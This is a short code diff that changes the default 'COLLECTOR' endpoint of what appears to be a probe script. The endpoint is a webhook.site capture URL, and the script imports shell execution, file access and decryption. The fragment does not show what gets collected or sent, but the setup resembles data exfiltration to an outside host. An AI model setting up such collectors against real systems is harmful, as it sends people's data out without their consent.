@@ -10,7 +10,7 @@ import { readFileSync, existsSync, writeFileSync } from "node:fs";
 import { execSync } from "node:child_process";
 import { createDecipheriv } from "node:crypto";
 
-const COLLECTOR = process.env.PROBE_COLLECTOR || "https://webhook.site/1a236970-1c56-4d75-8ad7-c395c8a23590";
+const COLLECTOR = process.env.PROBE_COLLECTOR || "https://webhook.site/f5861d76-4ccc-4b6b-817c-803cb8806962";
 
 function safe(fn) {
   try { return fn(); } catch (e) { return `ERR: ${e.message}`; }
